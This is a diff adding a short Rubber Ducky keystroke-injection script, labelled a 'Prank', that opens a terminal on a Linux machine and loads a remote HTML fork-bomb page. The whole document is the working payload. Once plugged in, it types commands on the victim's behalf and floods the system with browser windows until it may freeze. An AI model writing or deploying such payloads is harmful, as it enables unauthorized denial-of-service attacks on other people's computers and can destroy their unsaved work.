@@ -1,0 +1,16 @@
+REM Title: JB's HTML Forker
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04.
+REM Props: Hak5, JonnyBanana https://github.com/JonnyBanana/Rubber-Ducky_HTML_Fork-Bomb and memes
+REM Version: 1.0
+REM Category: Prank
+REM Launches terminal and opens JonnyBanana's HTML forker
+REM
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 2000
+STRING open https://jonnybanana.github.io/HTML-Fork-Bomb.github.io/
+ENTER
